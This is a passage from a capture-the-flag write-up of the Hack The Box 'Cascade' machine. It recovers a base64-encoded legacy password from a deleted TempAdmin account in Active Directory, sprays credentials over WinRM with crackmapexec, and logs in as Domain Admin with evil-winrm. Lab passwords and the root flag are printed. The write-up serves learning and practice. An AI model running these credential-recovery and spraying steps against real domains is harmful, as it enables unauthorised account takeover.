DistinguishedName : CN=CASC-WS1\0ADEL:6d97daa4-2e82-4946-a11e-f91fa18bfabe,CN=Deleted Objects,DC=cascade,DC=local
Name              : CASC-WS1
                    DEL:6d97daa4-2e82-4946-a11e-f91fa18bfabe
ObjectClass       : computer
ObjectGUID        : 6d97daa4-2e82-4946-a11e-f91fa18bfabe

Deleted           : True
DistinguishedName : CN=Scheduled Tasks\0ADEL:13375728-5ddb-4137-b8b8-b9041d1d3fd2,CN=Deleted Objects,DC=cascade,DC=local
Name              : Scheduled Tasks
                    DEL:13375728-5ddb-4137-b8b8-b9041d1d3fd2
ObjectClass       : group
ObjectGUID        : 13375728-5ddb-4137-b8b8-b9041d1d3fd2

Deleted           : True
DistinguishedName : CN={A403B701-A528-4685-A816-FDEE32BDDCBA}\0ADEL:ff5c2fdc-cc11-44e3-ae4c-071aab2ccc6e,CN=Deleted Objects,DC=cascade,DC=local
Name              : {A403B701-A528-4685-A816-FDEE32BDDCBA}
                    DEL:ff5c2fdc-cc11-44e3-ae4c-071aab2ccc6e
ObjectClass       : groupPolicyContainer
ObjectGUID        : ff5c2fdc-cc11-44e3-ae4c-071aab2ccc6e

Deleted           : True
DistinguishedName : CN=Machine\0ADEL:93c23674-e411-400b-bb9f-c0340bda5a34,CN=Deleted Objects,DC=cascade,DC=local
Name              : Machine
                    DEL:93c23674-e411-400b-bb9f-c0340bda5a34
ObjectClass       : container
ObjectGUID        : 93c23674-e411-400b-bb9f-c0340bda5a34

Deleted           : True
DistinguishedName : CN=User\0ADEL:746385f2-e3a0-4252-b83a-5a206da0ed88,CN=Deleted Objects,DC=cascade,DC=local
Name              : User
                    DEL:746385f2-e3a0-4252-b83a-5a206da0ed88
ObjectClass       : container
ObjectGUID        : 746385f2-e3a0-4252-b83a-5a206da0ed88

Deleted           : True
DistinguishedName : CN=TempAdmin\0ADEL:f0cc344d-31e0-4866-bceb-a842791ca059,CN=Deleted Objects,DC=cascade,DC=local
Name              : TempAdmin
                    DEL:f0cc344d-31e0-4866-bceb-a842791ca059
ObjectClass       : user
ObjectGUID        : f0cc344d-31e0-4866-bceb-a842791ca059
```
There is the `TempAdmin` user we were looking for.  We can restore it with `Restore-ADObject -Identity "<ObjectGUID>"`
```
*Evil-WinRM* PS C:\Program Files (x86)> Restore-ADObject -Identity "f0cc344d-31e0-4866-bceb-a842791ca059"
Insufficient access rights to perform the operation
At line:1 char:1
+ Restore-ADObject -Identity "f0cc344d-31e0-4866-bceb-a842791ca059"
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : InvalidOperation: (CN=TempAdmin\0A...ascade,DC=local:ADObject) [Restore-ADObject], ADException
    + FullyQualifiedErrorId : 0,Microsoft.ActiveDirectory.Management.Commands.RestoreADObject
```
WEll that looks like a bust...what else can this user do with a deleted account?

```
*Evil-WinRM* PS C:\Program Files (x86)> Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *


CanonicalName                   : cascade.local/Deleted Objects
CN                              : Deleted Objects
Created                         : 1/9/2020 3:31:39 PM
createTimeStamp                 : 1/9/2020 3:31:39 PM
Deleted                         : True
Description                     : Default container for deleted objects
DisplayName                     :
DistinguishedName               : CN=Deleted Objects,DC=cascade,DC=local
dSCorePropagationData           : {1/1/1601 12:00:00 AM}
instanceType                    : 4
isCriticalSystemObject          : True
isDeleted                       : True
LastKnownParent                 :
Modified                        : 1/13/2020 1:21:17 AM
modifyTimeStamp                 : 1/13/2020 1:21:17 AM
Name                            : Deleted Objects
ObjectCategory                  : CN=Container,CN=Schema,CN=Configuration,DC=cascade,DC=local
ObjectClass                     : container
ObjectGUID                      : 51de9801-3625-4ac2-a605-d6bd71617681
ProtectedFromAccidentalDeletion :
sDRightsEffective               : 0
showInAdvancedViewOnly          : True
systemFlags                     : -1946157056
uSNChanged                      : 65585
uSNCreated                      : 5695
whenChanged                     : 1/13/2020 1:21:17 AM
whenCreated                     : 1/9/2020 3:31:39 PM

accountExpires                  : 9223372036854775807
badPasswordTime                 : 0
badPwdCount                     : 0
CanonicalName                   : cascade.local/Deleted Objects/CASC-WS1
                                  DEL:6d97daa4-2e82-4946-a11e-f91fa18bfabe
CN                              : CASC-WS1
                                  DEL:6d97daa4-2e82-4946-a11e-f91fa18bfabe
codePage                        : 0
countryCode                     : 0
Created                         : 1/9/2020 7:30:19 PM
createTimeStamp                 : 1/9/2020 7:30:19 PM
Deleted                         : True
Description                     :
DisplayName                     :
DistinguishedName               : CN=CASC-WS1\0ADEL:6d97daa4-2e82-4946-a11e-f91fa18bfabe,CN=Deleted Objects,DC=cascade,DC=local
dSCorePropagationData           : {1/17/2020 3:37:36 AM, 1/17/2020 12:14:04 AM, 1/9/2020 7:30:19 PM, 1/1/1601 12:04:17 AM}
instanceType                    : 4
isCriticalSystemObject          : False
isDeleted                       : True
LastKnownParent                 : OU=Computers,OU=UK,DC=cascade,DC=local
lastLogoff                      : 0
lastLogon                       : 0
localPolicyFlags                : 0
logonCount                      : 0
Modified                        : 1/28/2020 6:08:35 PM
modifyTimeStamp                 : 1/28/2020 6:08:35 PM
msDS-LastKnownRDN               : CASC-WS1
Name                            : CASC-WS1
                                  DEL:6d97daa4-2e82-4946-a11e-f91fa18bfabe
nTSecurityDescriptor            : System.DirectoryServices.ActiveDirectorySecurity
ObjectCategory                  :
ObjectClass                     : computer
ObjectGUID                      : 6d97daa4-2e82-4946-a11e-f91fa18bfabe
objectSid                       : S-1-5-21-3332504370-1206983947-1165150453-1108
primaryGroupID                  : 515
ProtectedFromAccidentalDeletion : False
pwdLastSet                      : 132230718192147073
sAMAccountName                  : CASC-WS1$
sDRightsEffective               : 0
userAccountControl              : 4128
uSNChanged                      : 245849
uSNCreated                      : 24603
whenChanged                     : 1/28/2020 6:08:35 PM
whenCreated                     : 1/9/2020 7:30:19 PM

CanonicalName                   : cascade.local/Deleted Objects/Scheduled Tasks
                                  DEL:13375728-5ddb-4137-b8b8-b9041d1d3fd2
CN                              : Scheduled Tasks
                                  DEL:13375728-5ddb-4137-b8b8-b9041d1d3fd2
Created                         : 1/13/2020 5:21:53 PM
createTimeStamp                 : 1/13/2020 5:21:53 PM
Deleted                         : True
Description                     :
DisplayName                     :
DistinguishedName               : CN=Scheduled Tasks\0ADEL:13375728-5ddb-4137-b8b8-b9041d1d3fd2,CN=Deleted Objects,DC=cascade,DC=local
dSCorePropagationData           : {1/17/2020 9:35:46 PM, 1/17/2020 9:32:57 PM, 1/17/2020 3:37:36 AM, 1/17/2020 12:14:04 AM...}
groupType                       : -2147483644
instanceType                    : 4
isDeleted                       : True
LastKnownParent                 : OU=Groups,OU=UK,DC=cascade,DC=local
Modified                        : 1/28/2020 6:07:55 PM
modifyTimeStamp                 : 1/28/2020 6:07:55 PM
msDS-LastKnownRDN               : Scheduled Tasks
Name                            : Scheduled Tasks
                                  DEL:13375728-5ddb-4137-b8b8-b9041d1d3fd2
nTSecurityDescriptor            : System.DirectoryServices.ActiveDirectorySecurity
ObjectCategory                  :
ObjectClass                     : group
ObjectGUID                      : 13375728-5ddb-4137-b8b8-b9041d1d3fd2
objectSid                       : S-1-5-21-3332504370-1206983947-1165150453-1131
ProtectedFromAccidentalDeletion : False
sAMAccountName                  : Scheduled Tasks
sDRightsEffective               : 0
uSNChanged                      : 245848
uSNCreated                      : 114790
whenChanged                     : 1/28/2020 6:07:55 PM
whenCreated                     : 1/13/2020 5:21:53 PM

CanonicalName                   : cascade.local/Deleted Objects/{A403B701-A528-4685-A816-FDEE32BDDCBA}
                                  DEL:ff5c2fdc-cc11-44e3-ae4c-071aab2ccc6e
CN                              : {A403B701-A528-4685-A816-FDEE32BDDCBA}
                                  DEL:ff5c2fdc-cc11-44e3-ae4c-071aab2ccc6e
Created                         : 1/26/2020 2:34:30 AM
createTimeStamp                 : 1/26/2020 2:34:30 AM
Deleted                         : True
Description                     :
DisplayName                     : Block Potato
DistinguishedName               : CN={A403B701-A528-4685-A816-FDEE32BDDCBA}\0ADEL:ff5c2fdc-cc11-44e3-ae4c-071aab2ccc6e,CN=Deleted Objects,DC=cascade,DC=local
dSCorePropagationData           : {1/1/1601 12:00:00 AM}
flags                           : 0
gPCFileSysPath                  : \\cascade.local\SysVol\cascade.local\Policies\{A403B701-A528-4685-A816-FDEE32BDDCBA}
gPCFunctionalityVersion         : 2
gPCMachineExtensionNames        : [{35378EAC-683F-11D2-A89A-00C04FBBCFA2}{53D6AB1D-2488-11D1-A28C-00C04FB94F17}][{B1BE8D72-6EAC-11D2-A4EA-00C04F79F83A}{53D6AB1D-2488-11D1-A28C-00C04FB94F17}]
instanceType                    : 4
isDeleted                       : True
LastKnownParent                 : CN=Policies,CN=System,DC=cascade,DC=local
Modified                        : 1/26/2020 2:40:52 AM
modifyTimeStamp                 : 1/26/2020 2:40:52 AM
msDS-LastKnownRDN               : {A403B701-A528-4685-A816-FDEE32BDDCBA}
Name                            : {A403B701-A528-4685-A816-FDEE32BDDCBA}
                                  DEL:ff5c2fdc-cc11-44e3-ae4c-071aab2ccc6e
nTSecurityDescriptor            : System.DirectoryServices.ActiveDirectorySecurity
ObjectCategory                  :
ObjectClass                     : groupPolicyContainer
ObjectGUID                      : ff5c2fdc-cc11-44e3-ae4c-071aab2ccc6e
ProtectedFromAccidentalDeletion : False
sDRightsEffective               : 0
showInAdvancedViewOnly          : True
uSNChanged                      : 196701
uSNCreated                      : 196688
versionNumber                   : 2
whenChanged                     : 1/26/2020 2:40:52 AM
whenCreated                     : 1/26/2020 2:34:30 AM

CanonicalName                   : cascade.local/Deleted Objects/Machine
                                  DEL:93c23674-e411-400b-bb9f-c0340bda5a34
CN                              : Machine
                                  DEL:93c23674-e411-400b-bb9f-c0340bda5a34
Created                         : 1/26/2020 2:34:31 AM
createTimeStamp                 : 1/26/2020 2:34:31 AM
Deleted                         : True
Description                     :
DisplayName                     :
DistinguishedName               : CN=Machine\0ADEL:93c23674-e411-400b-bb9f-c0340bda5a34,CN=Deleted Objects,DC=cascade,DC=local
dSCorePropagationData           : {1/1/1601 12:00:00 AM}
instanceType                    : 4
isDeleted                       : True
LastKnownParent                 : CN={A403B701-A528-4685-A816-FDEE32BDDCBA}\0ADEL:ff5c2fdc-cc11-44e3-ae4c-071aab2ccc6e,CN=Deleted Objects,DC=cascade,DC=local
Modified                        : 1/26/2020 2:40:52 AM
modifyTimeStamp                 : 1/26/2020 2:40:52 AM
msDS-LastKnownRDN               : Machine
Name                            : Machine
                                  DEL:93c23674-e411-400b-bb9f-c0340bda5a34
nTSecurityDescriptor            : System.DirectoryServices.ActiveDirectorySecurity
ObjectCategory                  :
ObjectClass                     : container
ObjectGUID                      : 93c23674-e411-400b-bb9f-c0340bda5a34
ProtectedFromAccidentalDeletion : False
sDRightsEffective               : 0
showInAdvancedViewOnly          : True
uSNChanged                      : 196699
uSNCreated                      : 196689
whenChanged                     : 1/26/2020 2:40:52 AM
whenCreated                     : 1/26/2020 2:34:31 AM

CanonicalName                   : cascade.local/Deleted Objects/User
                                  DEL:746385f2-e3a0-4252-b83a-5a206da0ed88
CN                              : User
                                  DEL:746385f2-e3a0-4252-b83a-5a206da0ed88
Created                         : 1/26/2020 2:34:31 AM
createTimeStamp                 : 1/26/2020 2:34:31 AM
Deleted                         : True
Description                     :
DisplayName                     :
DistinguishedName               : CN=User\0ADEL:746385f2-e3a0-4252-b83a-5a206da0ed88,CN=Deleted Objects,DC=cascade,DC=local
dSCorePropagationData           : {1/1/1601 12:00:00 AM}
instanceType                    : 4
isDeleted                       : True
LastKnownParent                 : CN={A403B701-A528-4685-A816-FDEE32BDDCBA}\0ADEL:ff5c2fdc-cc11-44e3-ae4c-071aab2ccc6e,CN=Deleted Objects,DC=cascade,DC=local
Modified                        : 1/26/2020 2:40:52 AM
modifyTimeStamp                 : 1/26/2020 2:40:52 AM
msDS-LastKnownRDN               : User
Name                            : User
                                  DEL:746385f2-e3a0-4252-b83a-5a206da0ed88
nTSecurityDescriptor            : System.DirectoryServices.ActiveDirectorySecurity
ObjectCategory                  :
ObjectClass                     : container
ObjectGUID                      : 746385f2-e3a0-4252-b83a-5a206da0ed88
ProtectedFromAccidentalDeletion : False
sDRightsEffective               : 0
showInAdvancedViewOnly          : True
uSNChanged                      : 196700
uSNCreated                      : 196690
whenChanged                     : 1/26/2020 2:40:52 AM
whenCreated                     : 1/26/2020 2:34:31 AM

accountExpires                  : 9223372036854775807
badPasswordTime                 : 0
badPwdCount                     : 0
CanonicalName                   : cascade.local/Deleted Objects/TempAdmin
                                  DEL:f0cc344d-31e0-4866-bceb-a842791ca059
cascadeLegacyPwd                : YmFDVDNyMWFOMDBkbGVz
CN                              : TempAdmin
                                  DEL:f0cc344d-31e0-4866-bceb-a842791ca059
codePage                        : 0
countryCode                     : 0
Created                         : 1/27/2020 3:23:08 AM
createTimeStamp                 : 1/27/2020 3:23:08 AM
Deleted                         : True
Description                     :
DisplayName                     : TempAdmin
DistinguishedName               : CN=TempAdmin\0ADEL:f0cc344d-31e0-4866-bceb-a842791ca059,CN=Deleted Objects,DC=cascade,DC=local
dSCorePropagationData           : {1/27/2020 3:23:08 AM, 1/1/1601 12:00:00 AM}
givenName                       : TempAdmin
instanceType                    : 4
isDeleted                       : True
LastKnownParent                 : OU=Users,OU=UK,DC=cascade,DC=local
lastLogoff                      : 0
lastLogon                       : 0
logonCount                      : 0
Modified                        : 1/27/2020 3:24:34 AM
modifyTimeStamp                 : 1/27/2020 3:24:34 AM
msDS-LastKnownRDN               : TempAdmin
Name                            : TempAdmin
                                  DEL:f0cc344d-31e0-4866-bceb-a842791ca059
nTSecurityDescriptor            : System.DirectoryServices.ActiveDirectorySecurity
ObjectCategory                  :
ObjectClass                     : user
ObjectGUID                      : f0cc344d-31e0-4866-bceb-a842791ca059
objectSid                       : S-1-5-21-3332504370-1206983947-1165150453-1136
primaryGroupID                  : 513
ProtectedFromAccidentalDeletion : False
pwdLastSet                      : 132245689883479503
sAMAccountName                  : TempAdmin
sDRightsEffective               : 0
userAccountControl              : 66048
userPrincipalName               : TempAdmin@cascade.local
uSNChanged                      : 237705
uSNCreated                      : 237695
whenChanged                     : 1/27/2020 3:24:34 AM
whenCreated                     : 1/27/2020 3:23:08 AM
```

There is another base64 encoded `CascLegacyPwd`.  `YmFDVDNyMWFOMDBkbGVz` decodes to baCT3r1aN00dles
```
zweilos@kalimaa:~/htb/cascade$ echo YmFDVDNyMWFOMDBkbGVz | base64 -d
baCT3r1aN00dles
```
### Getting a shell

```
zweilos@kalimaa:~/htb/cascade$ crackmapexec winrm -u users -p passwords -d Cascade 10.10.10.182
WINRM       10.10.10.182    5985   CASC-DC1         [*] http://10.10.10.182:5985/wsman
WINRM       10.10.10.182    5985   CASC-DC1         [-] Cascade\Administrator:rY4n5eva "the specified credentials were rejected by the server"
WINRM       10.10.10.182    5985   CASC-DC1         [-] Cascade\Administrator:sT333ve2 "the specified credentials were rejected by the server"
WINRM       10.10.10.182    5985   CASC-DC1         [-] Cascade\Administrator:w3lc0meFr31nd "the specified credentials were rejected by the server"
WINRM       10.10.10.182    5985   CASC-DC1         [+] Cascade\Administrator:baCT3r1aN00dles (Pwn3d!)
```
Pwn3d!
```
zweilos@kalimaa:~/htb/cascade$ evil-winrm -u Administrator -p baCT3r1aN00dles -i 10.10.10.182

Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents> ls
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ../Destop
Cannot find path 'C:\Users\Administrator\Destop' because it does not exist.
At line:1 char:1
+ cd ../Destop
+ ~~~~~~~~~~~~
    + CategoryInfo          : ObjectNotFound: (C:\Users\Administrator\Destop:String) [Set-Location], ItemNotFoundException
    + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.SetLocationCommand
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ../Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> ls


    Directory: C:\Users\Administrator\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        7/26/2020   8:56 AM             34 root.txt
-a----        3/25/2020  11:17 AM           1031 WinDirStat.lnk


*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
c819f64119a10a2aa646d6883796d488
*Evil-WinRM* PS C:\Users\Administrator\Desktop> whoami /all

USER INFORMATION
----------------

User Name             SID
===================== =============================================
cascade\administrator S-1-5-21-3332504370-1206983947-1165150453-500


GROUP INFORMATION
-----------------

Group Name                                     Type             SID                                            Attributes
============================================== ================ ============================================== ===============================================================
Everyone                                       Well-known group S-1-1-0                                        Mandatory group, Enabled by default, Enabled group
BUILTIN\Administrators                         Alias            S-1-5-32-544                                   Mandatory group, Enabled by default, Enabled group, Group owner
BUILTIN\Users                                  Alias            S-1-5-32-545                                   Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access     Alias            S-1-5-32-554                                   Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                           Well-known group S-1-5-2                                        Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users               Well-known group S-1-5-11                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization                 Well-known group S-1-5-15                                       Mandatory group, Enabled by default, Enabled group
CASCADE\Domain Admins                          Group            S-1-5-21-3332504370-1206983947-1165150453-512  Mandatory group, Enabled by default, Enabled group
CASCADE\Group Policy Creator Owners            Group            S-1-5-21-3332504370-1206983947-1165150453-520  Mandatory group, Enabled by default, Enabled group
CASCADE\Schema Admins                          Group            S-1-5-21-3332504370-1206983947-1165150453-518  Mandatory group, Enabled by default, Enabled group
CASCADE\Enterprise Admins                      Group            S-1-5-21-3332504370-1206983947-1165150453-519  Mandatory group, Enabled by default, Enabled group
CASCADE\Data Share                             Alias            S-1-5-21-3332504370-1206983947-1165150453-1138 Mandatory group, Enabled by default, Enabled group, Local Group
CASCADE\Denied RODC Password Replication Group Alias            S-1-5-21-3332504370-1206983947-1165150453-572  Mandatory group, Enabled by default, Enabled group, Local Group
NT AUTHORITY\NTLM Authentication               Well-known group S-1-5-64-10                                    Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level           Label            S-1-16-12288


PRIVILEGES INFORMATION
----------------------

Privilege Name                  Description                                                    State
=============================== ============================================================== =======
SeIncreaseQuotaPrivilege        Adjust memory quotas for a process                             Enabled
SeMachineAccountPrivilege       Add workstations to domain                                     Enabled
SeSecurityPrivilege             Manage auditing and security log                               Enabled
SeTakeOwnershipPrivilege        Take ownership of files or other objects                       Enabled
SeLoadDriverPrivilege           Load and unload device drivers                                 Enabled
SeSystemProfilePrivilege        Profile system performance                                     Enabled
SeSystemtimePrivilege           Change the system time                                         Enabled
SeProfileSingleProcessPrivilege Profile single process                                         Enabled
SeIncreaseBasePriorityPrivilege Increase scheduling priority                                   Enabled
SeCreatePagefilePrivilege       Create a pagefile                                              Enabled
SeBackupPrivilege               Back up files and directories                                  Enabled
SeRestorePrivilege              Restore files and directories                                  Enabled
SeShutdownPrivilege             Shut down the system                                           Enabled
SeDebugPrivilege                Debug programs                                                 Enabled
SeSystemEnvironmentPrivilege    Modify firmware environment values                             Enabled
SeChangeNotifyPrivilege         Bypass traverse checking                                       Enabled
SeRemoteShutdownPrivilege       Force shutdown from a remote system                            Enabled
SeUndockPrivilege               Remove computer from docking station                           Enabled
SeEnableDelegationPrivilege     Enable computer and user accounts to be trusted for delegation Enabled
SeManageVolumePrivilege         Perform volume maintenance tasks                               Enabled
SeImpersonatePrivilege          Impersonate a client after authentication                      Enabled
SeCreateGlobalPrivilege         Create global objects                                          Enabled
SeIncreaseWorkingSetPrivilege   Increase a process working set                                 Enabled
SeTimeZonePrivilege             Change the time zone                                           Enabled
SeCreateSymbolicLinkPrivilege   Create symbolic links                                          Enabled
*Evil-WinRM* PS C:\Users\Administrator\Desktop>
```

Woot! Domain Admin!
### Root.txt

Thanks to [`Vbscrub`](https://www.hackthebox.eu/home/users/profile/158833) for <something interesting or useful about this machine.

If you like this content and would like to see more, please consider supporting me through Patreon at [https://www.patreon.com/zweilosec](https://www.patreon.com/zweilosec).
